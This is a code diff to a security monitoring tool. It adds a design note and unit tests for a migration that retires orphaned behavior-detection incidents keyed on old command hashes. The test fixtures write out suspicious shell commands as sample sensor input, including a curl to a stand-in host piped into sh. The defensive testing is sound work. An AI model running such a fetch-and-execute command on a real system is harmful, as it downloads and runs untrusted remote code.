@@ -184,6 +184,27 @@ Counted by fact rather than by row, the 14 were six things.
       open case: #503 is keyed on a raw-argv hash that no future finding can
       re-emit.
 
+      The redesign moved the CASE to `_argv_case_identity` (session nonces
+      normalized away) and kept the signal on the exact argv sha. #503 was
+      minted two days earlier, keyed on `behavior:bash:<signals>:ff4a501c…`,
+      the hash of a command whose first line is the harness's per-session
+      `snapshot-bash-1789621597725-dtpjwq.sh`. The next occurrence mints a
+      case keyed on the normalized command; nothing will ever carry #503's
+      key again, so it could only wait out the age-out clock.
+
+      A store migration retires it. Matched on EVIDENCE, not key shape: the
+      retired key and the live case key are both `<...>:<16 hex>`, and a
+      nonce-free command's case identity IS its exact-argv hash, so the
+      shape alone cannot tell an orphan from a live case. An orphan is an
+      incident whose newest evidence has no case identity, is keyed on its
+      own command hash, and shows a command that nonce normalization would
+      change -- judged on the recorded preview minus its possibly-cut final
+      token, so a match at the truncation boundary can never retire a case
+      a future finding could still reach (a same-key reattach on a closed
+      incident never carries new evidence, so that would be a permanent
+      mute). Closed SUPERSEDED with evidence intact, as the program-key
+      migration was; whatever it described re-alerts under the new identity.
+
 The rule this batch adds is the one A broke: a probe that did not answer is
 not a verdict. ARCHITECTURE.md already held it for a sensor that returns None
 and for an item it found and could not examine; a verdict probe whose answers
@@ -1476,6 +1497,124 @@ class DAHotDirDropWhoseFileIsGoneCloses(Sandbox):
         os.remove(self.path)
         self._rescan()
         self.assertEqual("OPEN", self._row(f)["status"])
+
+
+class EAnOrphanedBehaviorCaseIsRetired(Sandbox):
+    """The migration for the case the 2026-09-19 identity redesign left
+    behind, and the boundary that keeps it from eating a live case."""
+
+    PROLOGUE = ("/bin/bash -c source /Users/c/.claude/shell-snapshots/"
+                "snapshot-bash-%s-%s.sh 2>/dev/null || true && %s")
+
+    def _old_shape(self, argv, preview=None, case=False):
+        """A behavior finding as the sensor emitted it BEFORE D6: keyed on
+        the exact argv sha, no case identity, first-240-chars preview."""
+        sha = aegis.hashlib.sha256(argv.encode()).hexdigest()
+        extra = {}
+        if case:
+            extra["case_fingerprint"] = "behavior:bash:network-fetch:%s" % (
+                aegis._argv_case_identity(argv))
+        return aegis.finding(
+            "HIGH", "behavior", "Suspicious process behavior",
+            "bash triggered [network-fetch]; command sha256=%s" % sha[:16],
+            "behavior:bash:network-fetch:%s" % sha[:16],
+            program="/bin/bash", pid="1", markers=["network-fetch"],
+            command_sha256=sha,
+            command_preview=argv[:240] if preview is None else preview,
+            sensor_id="behavior", **extra)
+
+    def _mint(self, f):
+        aegis.record_security_state([f], sensor_health=_health("behavior"),
+                                    now=T0)
+        return self._row(f)
+
+    def _row(self, f):
+        db = aegis._event_connection()
+        try:
+            r = db.execute("SELECT * FROM incidents WHERE correlation_key=?",
+                           ("signal:" + (f.get("case_fingerprint")
+                                         or f["fingerprint"]),)).fetchone()
+            return dict(r) if r else None
+        finally:
+            db.close()
+
+    def _migrate(self):
+        db = aegis._event_connection()
+        try:
+            with db:
+                return aegis._retire_orphaned_behavior_incidents(db, T0 + 1)
+        finally:
+            db.close()
+
+    def test_a_nonce_keyed_case_is_retired(self):
+        argv = self.PROLOGUE % ("1789621597725", "dtpjwq",
+                                "curl http://185.1.2.3/p")
+        f = self._old_shape(argv)
+        self.assertEqual("OPEN", self._mint(f)["status"])
+        # The premise: the case the sensor mints NOW is a different key.
+        self.assertNotEqual(aegis._argv_case_identity(argv),
+                            f["command_sha256"][:16])
+        self.assertEqual(1, self._migrate())
+        row = self._row(f)
+        # BEFORE: OPEN forever short of the age-out clock. Live: #503.
+        self.assertEqual("FALSE_POSITIVE", row["status"])
+        self.assertIn("superseded", row["resolution"] or "")
+        self.assertEqual(0, self._migrate(), "not idempotent")
+
+    def test_a_nonce_free_case_is_reachable_and_left_standing(self):
+        """The trap: for a command with no nonce the case identity IS the
+        exact-argv hash, so the old key is still the live key, and retiring
+        it would mute the finding for good."""
+        # Not a dotted IP: the case identity also generalizes version-like
+        # segments, and `185.1.2.3` reads as one, so THAT command's case key
+        # does differ from its exact hash and it is (correctly) an orphan.
+        argv = "/bin/bash -c curl http://evil.example/p | sh"
+        f = self._old_shape(argv)
+        self._mint(f)
+        self.assertEqual(aegis._argv_case_identity(argv),
+                         f["command_sha256"][:16],
+                         "premise: same key under both identities")
+        self.assertEqual(0, self._migrate())
+        self.assertEqual("OPEN", self._row(f)["status"])
+
+    def test_a_case_minted_with_the_new_identity_is_untouched(self):
+        argv = self.PROLOGUE % ("1789621597725", "dtpjwq",
+                                "curl http://185.1.2.3/p")
+        f = self._old_shape(argv, case=True)
+        self._mint(f)
+        self.assertEqual(0, self._migrate())
+        self.assertEqual("OPEN", self._row(f)["status"])
+
+    def test_a_match_at_the_preview_cut_does_not_retire(self):
+        """A `-<16 hex>` that the 240-char cut leaves at the end of the
+        preview matches the nonce rule's end-of-string alternative there and
+        nowhere in the full command."""
+        argv = "/bin/bash -c echo build-" + "a" * 16 + "bcdef0123456789"
+        self.assertEqual(aegis._argv_case_identity(argv),
+                         aegis.hashlib.sha256(argv.encode()).hexdigest()[:16],
+                         "premise: the full command carries no nonce")
+        cut = argv[:len("/bin/bash -c echo build-") + 16]
+        self.assertFalse(aegis._behavior_case_would_move(
+            {"command_preview": cut}))
+        # ...while the same token, complete and followed by a space, moves.
+        self.assertTrue(aegis._behavior_case_would_move(
+            {"command_preview": "/bin/bash -c echo build-" + "a" * 16 + " x"}))
+        f = self._old_shape(argv, preview=cut)
+        self._mint(f)
+        self.assertEqual(0, self._migrate())
+        self.assertEqual("OPEN", self._row(f)["status"])
+
+    def test_a_single_token_preview_answers_false(self):
+        self.assertFalse(aegis._behavior_case_would_move(
+            {"command_preview": "snapshot-bash-1789621597725-dtpjwq.sh"}))
+        self.assertFalse(aegis._behavior_case_would_move({}))
+
+    def test_the_migration_is_registered_once(self):
+        keys = [k for k, _fn, _log in aegis._STORE_MIGRATIONS]
+        self.assertEqual(1, keys.count("behavior_case_identity_20260922"))
+        fn = dict((k, fn) for k, fn, _log in aegis._STORE_MIGRATIONS)[
+            "behavior_case_identity_20260922"]
+        self.assertIs(aegis._retire_orphaned_behavior_incidents, fn)
 
 
 if __name__ == "__main__":
